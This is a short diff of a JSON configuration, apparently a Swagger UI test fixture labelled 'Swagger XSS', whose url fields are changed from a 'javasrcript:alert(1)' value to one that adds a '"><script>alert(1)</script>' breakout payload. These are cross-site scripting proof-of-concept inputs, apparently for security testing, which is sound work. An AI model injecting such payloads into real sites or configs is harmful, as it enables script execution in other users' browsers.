@@ -1,9 +1,9 @@
 
 {
-    "url": "javasrcript:alert(1)",
+    "url": "javasrcript:alert(1)"><script>alert(1)</script>",
     "urls": [
         {
-            "url": "javasrcript:alert(1)",
+            "url": "javasrcript:alert(1)"><script>alert(1)</script>",
             "name": "Swagger XSS"
         }
     ]
